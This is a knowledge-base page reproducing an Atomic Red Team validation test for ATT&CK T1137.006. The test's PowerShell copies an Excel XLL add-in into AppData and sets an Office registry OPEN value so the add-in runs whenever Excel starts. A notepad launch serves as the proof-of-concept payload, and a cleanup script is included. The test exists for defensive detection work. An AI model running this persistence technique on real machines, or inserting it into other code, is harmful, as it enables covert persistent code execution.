---
atomic_guid: "9c307886-9fef-41d5-b344-073a0f5b2f5f"
title: "Persistent Code Execution Via Excel Add-in File (XLL)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.006"
attack_technique_name: "Office Application Startup: Add-ins"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "9c307886-9fef-41d5-b344-073a0f5b2f5f"
  - "Persistent Code Execution Via Excel Add-in File (XLL)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Persistent Code Execution Via Excel Add-in File (XLL)

Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started
The sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.

## Metadata

- Atomic GUID: 9c307886-9fef-41d5-b344-073a0f5b2f5f
- Technique: T1137.006: Office Application Startup: Add-ins
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1137.006/T1137.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup|T1137.006]]

## Dependencies

Microsoft Excel must be installed

### Prerequisite Check

```untitled
try {
  New-Object -COMObject "Excel.Application" | Out-Null
  Stop-Process -Name "Excel"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```untitled
Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
```

XLL files must exist on disk at specified location

### Prerequisite Check

```untitled
if ((Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll") -and (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll")) {exit 0} else {exit 1}
```

### Get Prerequisite

```untitled
New-Item -Type Directory "PathToAtomicsFolder\T1137.006\bin\Addins\" -Force | Out-Null
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"
```

## Executor

- name: powershell

### Command

```powershell
$excelApp = New-Object -COMObject "Excel.Application"
if(-not $excelApp.path.contains("Program Files (x86)")){
    Write-Host "64-bit Office"
    Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
}
else{
  Write-Host "32-bit Office"
  Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
}
$ver = $excelApp.version
$ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"
Remove-Item $ExcelRegPath -ErrorAction Ignore
New-Item -type Directory $ExcelRegPath | Out-Null
New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll" -propertyType string | Out-Null
$excelApp.Quit()
Start-Process "Excel"
```

### Cleanup

```powershell
$ver = (New-Object -COMObject "Excel.Application").version
Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore
Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
Start-Sleep 3
Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.yaml)
